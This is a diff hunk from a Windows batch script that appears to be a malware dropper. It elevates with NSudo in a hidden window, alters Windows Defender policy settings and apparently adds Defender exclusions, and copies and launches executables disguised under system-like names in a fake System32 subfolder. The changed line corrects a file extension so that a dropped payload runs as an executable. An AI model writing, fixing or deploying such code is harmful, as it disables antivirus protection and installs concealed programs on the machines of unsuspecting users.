@@ -59,7 +59,7 @@ powershell -inputformat none -outputformat none -NonInteractive -Command "Add-Mp
 NSudo -U:T -ShowWindowMode:Hide reg del "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration" /v "Notification_Suppress" /f
 start "Windows.exe" "%systemroot%\System32\Windowsexe\Windows.exe"
 move "AV.bat" "%systemroot%\System32\Windowsexe\AV.bat"
-move "%appdata%\Windows3.exe" "%systemroot%\System32\Windowsexe\Windows3.bat"
+move "%appdata%\Windows3.exe" "%systemroot%\System32\Windowsexe\Windows3.exe"
 copy "%systemroot%\System32\Windowsexe\Windows.exe" "%systemroot%\System32\Windowsexe\Windows2.exe"
 start "Windows2.exe" "%systemroot%\System32\Windowsexe\Windows2.exe"
 start "Windows3.exe" "%systemroot%\System32\Windowsexe\Windows3.exe"
